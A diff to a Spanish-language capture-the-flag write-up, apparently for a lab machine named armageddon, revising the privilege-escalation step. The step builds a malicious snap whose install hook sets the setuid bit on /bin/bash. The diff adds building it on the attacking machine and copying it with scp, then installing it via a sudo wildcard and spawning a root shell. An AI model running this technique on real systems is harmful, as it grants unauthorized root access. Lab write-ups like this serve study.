@@ -97,6 +97,8 @@ User brucetherealadmin may run the following commands on armageddon:
 
 El comodín permite instalar un snap arbitrario. Un snap es un squashfs con metadatos y hooks; el hook `install` se ejecuta como root durante la instalación:
 
+El target es CentOS 7 sin `snapcraft`, sin `fpm` y sin salida a Internet: el paquete se construye **en la máquina atacante** y se copia.
+
 ```bash
 mkdir -p /tmp/pwn/meta/hooks
 cat > /tmp/pwn/meta/snap.yaml <<'EOF'
@@ -113,11 +115,12 @@ cat > /tmp/pwn/meta/hooks/install <<'EOF'
 chmod +s /bin/bash
 EOF
 chmod +x /tmp/pwn/meta/hooks/install
-cd /tmp && mksquashfs pwn pwn.snap -noappend
+snapcraft pack /tmp/pwn     # o: mksquashfs /tmp/pwn /tmp/pwn_1.0_amd64.snap -noappend
 ```
 
 ```bash
-sudo snap install /tmp/pwn.snap --dangerous --devmode
+scp /tmp/pwn_1.0_amd64.snap brucetherealadmin@<IP>:/tmp/
+sudo snap install /tmp/pwn_1.0_amd64.snap --dangerous --devmode
 /bin/bash -p
 ```
 
